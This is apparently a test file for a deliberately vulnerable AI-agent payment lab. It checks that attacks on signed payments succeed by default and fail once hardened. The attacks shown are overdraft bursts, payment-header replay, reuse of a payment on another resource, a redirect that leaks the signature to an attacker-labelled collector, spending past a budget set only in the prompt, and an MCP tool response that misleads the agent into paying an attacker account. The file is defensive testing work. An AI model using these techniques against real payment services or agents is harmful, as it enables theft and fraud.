"""Black-box tests for the Chapter 3 bugs that need a signed payment: V16, V17, V18, V19.

Python can't sign ed25519 with the stdlib, so signing goes through `scripts/pay.ts` (Stack.pay). Everything else —
replaying, bursting, serving a redirect — is plain HTTP from here.
"""
import base64
import http.server
import json
import sys
import threading
import unittest
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from dvap_harness import stack  # noqa: E402

WALLET, VETTINGCO = "acct_agent_wallet", "acct_vettingco"
HDR = "payment-signature"


def get(url: str, header: str | None = None) -> int:
    req = urllib.request.Request(url, headers={HDR: header} if header else {})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def burst(url: str, headers: list[str]) -> list[int]:
    with ThreadPoolExecutor(max_workers=len(headers)) as ex:
        return list(ex.map(lambda h: get(url, h), headers))


class V16Overdraft(unittest.TestCase):
    def run_overdraft(self, harden: str):
        with stack(harden) as s:
            url = s.urls["merchant"] + "/v1/premium/vendor-deep-dive/p_globex"  # $2 each
            affordable = s.balance(WALLET) // 2_000_000
            headers = s.pay("headers", url, str(affordable + 4))["headers"]
            before = s.balance(VETTINGCO)
            codes = burst(url, headers)
            return affordable, codes, s.balance(VETTINGCO) - before

    def test_default_serves_unpaid_requests(self):
        affordable, codes, paid = self.run_overdraft("")
        self.assertEqual(codes.count(200), affordable + 4)
        self.assertEqual(paid, affordable * 2_000_000, "merchant was paid for fewer requests than it served")

    def test_hardened_serves_only_settled(self):
        affordable, codes, paid = self.run_overdraft("V16")
        self.assertEqual(codes.count(200), affordable)
        self.assertEqual(paid, affordable * 2_000_000)


class V17DuplicateSettle(unittest.TestCase):
    def run_replay(self, harden: str):
        with stack(harden) as s:
            url = s.urls["merchant"] + "/v1/vendor-check/p_globex"  # $0.25
            header = s.pay("header", url)["header"]
            before = s.balance(VETTINGCO)
            codes = burst(url, [header] * 8)
            return codes, s.balance(VETTINGCO) - before

    def test_default_one_payment_many_responses(self):
        codes, paid = self.run_replay("V16")  # V16 fixed so the V17 effect is isolated
        self.assertGreater(codes.count(200), 1)
        self.assertEqual(paid, 250_000, "the merchant was paid exactly once")

    def test_hardened_one_response(self):
        codes, paid = self.run_replay("V16,V17")
        self.assertEqual(codes.count(200), 1)
        self.assertEqual(paid, 250_000)


class V18WrongResource(unittest.TestCase):
    def replay(self, harden: str) -> int:
        with stack(harden) as s:
            header = s.pay("header", s.urls["merchant"] + "/v1/vendor-check/p_initech")["header"]
            return get(s.urls["merchant"] + "/v1/vendor-check/p_globex", header)

    def test_default_replays_on_another_resource(self):
        self.assertEqual(self.replay(""), 200)

    def test_hardened_refuses(self):
        self.assertEqual(self.replay("V18"), 402)


class _Collector(http.server.BaseHTTPRequestHandler):
    seen: list[str] = []

    def log_message(self, *a):  # silence
        pass

    def do_GET(self):
        if self.path.startswith("/collect"):
            _Collector.seen.append(self.headers.get(HDR) or "")
            self.send_response(200); self.end_headers(); self.wfile.write(b"{}")
            return
        if self.headers.get(HDR):  # second leg: redirect to the attacker's collector
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{self.server.server_port}/collect")
            self.end_headers()
            return
        challenge = {"x402Version": 2, "resource": {"url": f"http://127.0.0.1:{self.server.server_port}/paid", "description": "x", "mimeType": "application/json"},
                     "accepts": [{"scheme": "exact", "network": "dvap:local", "amount": "250000", "asset": "USDC", "payTo": VETTINGCO, "maxTimeoutSeconds": 60}]}
        self.send_response(402)
        self.send_header("payment-required", base64.b64encode(json.dumps(challenge).encode()).decode())
        self.end_headers()


class V19RedirectLeak(unittest.TestCase):
    def leaked(self, harden: str) -> list[str]:
        _Collector.seen = []
        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Collector)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            with stack(harden) as s:
                s.pay("buy", f"http://127.0.0.1:{srv.server_port}/paid")
        finally:
            srv.shutdown()
        return [h for h in _Collector.seen if h]

    def test_default_header_reaches_the_collector(self):
        self.assertEqual(len(self.leaked("")), 1)

    def test_hardened_header_stays_home(self):
        self.assertEqual(self.leaked("V19"), [])


class V6PromptOnlyCap(unittest.TestCase):
    def spent(self, harden: str) -> int:
        with stack(harden) as s:
            before = s.balance(WALLET)
            s.pay("buy", s.urls["merchant"] + "/v1/premium/vendor-deep-dive/p_globex", "10")  # ten $2 reports against a $5/day promise
            return before - s.balance(WALLET)

    def test_default_spends_the_whole_wallet(self):
        self.assertEqual(self.spent(""), 20_000_000)

    def test_hardened_stops_at_the_budget(self):
        self.assertEqual(self.spent("V6,V16"), 4_000_000)


class V22StructuredMismatch(unittest.TestCase):
    def run_enrich(self, harden: str) -> tuple[str, int]:
        with stack(harden) as s:
            req = urllib.request.Request(s.urls["vendorMcp"].replace("/mcp", "/control/mode"), method="POST",
                                         data=json.dumps({"mode": "benign"}).encode(), headers={"content-type": "application/json"})
            urllib.request.urlopen(req, timeout=10).read()
            out = s.run_agent("Pay the Hooli invoice", VENDOR_MCP_URL=s.urls["vendorMcp"], ENRICH_VENDOR="1", APPROVAL_TIMEOUT_MS="500")
            return out.stdout, s.balance("acct_globex_drop")

    def test_default_log_says_vettingco_money_goes_to_attacker(self):
        out, drop = self.run_enrich("")
        self.assertIn("Paid $0.25 to acct_vettingco for vendor enrichment", out)
        self.assertEqual(drop, 1_000_000)

    def test_hardened_refuses_mismatch(self):
        out, drop = self.run_enrich("V22")
        self.assertIn("differs between its text and structured copies", out)
        self.assertEqual(drop, 0)


if __name__ == "__main__":
    unittest.main()
